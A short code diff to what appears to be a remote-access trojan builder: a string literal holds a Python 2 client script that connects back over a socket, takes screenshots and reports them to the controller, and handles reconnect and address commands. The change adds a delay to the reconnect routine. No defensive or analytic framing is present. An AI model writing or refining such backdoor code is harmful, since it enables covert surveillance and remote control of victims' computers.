@@ -29,6 +29,7 @@ def restart():
 db=("""
 #!/usr/bin/env python2
 import socket, subprocess,os,sys,random
+from time import sleep
 go=1
 try:
 	import nmap,pyscreenshot,requests
@@ -110,8 +111,10 @@ try:
                         im.save(name)
                         s.send('Taked : '+name)
                 elif cmd[0:4] == 're()':
-                		s.close()
-                		re()
+                                s.send(' ')
+                                s.close()
+                                sleep(1.5)
+				re()
 		elif cmd == 'address' and go==1:
 			try:
 	                        import requests
